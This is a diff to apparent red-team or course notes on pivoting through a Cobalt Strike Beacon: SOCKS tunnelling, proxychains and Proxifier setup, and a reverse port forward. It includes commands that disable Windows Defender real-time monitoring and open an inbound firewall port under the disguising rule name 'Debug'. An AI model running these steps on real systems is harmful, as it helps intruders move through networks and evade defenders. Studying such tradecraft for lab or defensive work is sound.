@@ -10,10 +10,13 @@ Cobalt Strike and Beacon can act as a SOCKS proxy to exchange traffic between an
 
 Workflow
 ```powershell
-1. ## Set up Beacon as tunnel
-beacon> socks [port] [version] # default port 1080, socks5 is good version
+1. ## Add static DNS entries
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '<IP> <hostname>'
 
-2. ## Setup of proxifier (Windows) OR proxychains (Linux)
+2. ## Set up Beacon as tunnel
+beacon> socks [port (1080)] [version (socks5)] # default port 1080, socks5 is good version
+
+3. ## Setup of proxifier (Windows) OR proxychains (Linux)
 # Proxifier Setup
 Run Proxifier.exe
 Profile > Proxy Servers > Add
@@ -31,9 +34,6 @@ sudo vim /etc/proxychains.conf        # or nano
 	Comment out "proxy_dns" (line 38)   
 	socks5 [Team Server IP] [Port used]  
 # WSL inherits static host entries from Windows, so you don't need to add them to /etc/hosts if you've already added them in Windows.
-
-3. ## Add any /etc/hosts DNS entries you want
-Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '<IP> <hostname>'
 
 4. ## Setup your environment
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -100,7 +100,7 @@ beacon> rportfwd [bind port] [forward host] [forward port]
 	# forward : Beacon forwards traffic to this host on specified port
 
 # Add firwwall rule to allow inbound traffic
-beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190         # port number is arbitrary...
+beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190       # port number is arbitrary...
 
 # Start reverse port forward
 beacon> rportfwd 28190 localhost 80  # inbound traffic -> internal web server
